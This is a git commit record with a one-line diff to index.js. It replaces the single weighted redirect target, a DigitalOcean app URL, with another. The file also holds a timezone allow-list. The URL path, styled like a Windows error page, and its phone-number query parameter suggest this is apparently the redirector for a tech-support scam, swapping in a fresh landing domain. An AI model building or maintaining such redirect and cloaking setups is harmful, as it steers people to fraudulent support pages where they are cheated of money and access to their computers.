fbdbd054f4082e17336c4304164df9475326f915
paalakash <palaksh452@gmail.com>
2026-06-09 08:52:12 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://sea-lion-app-l5isp.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5551", weight: 1.0 }
+    { url: "https://jellyfish-app-k9uku.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5551", weight: 1.0 }
 
 ];
 
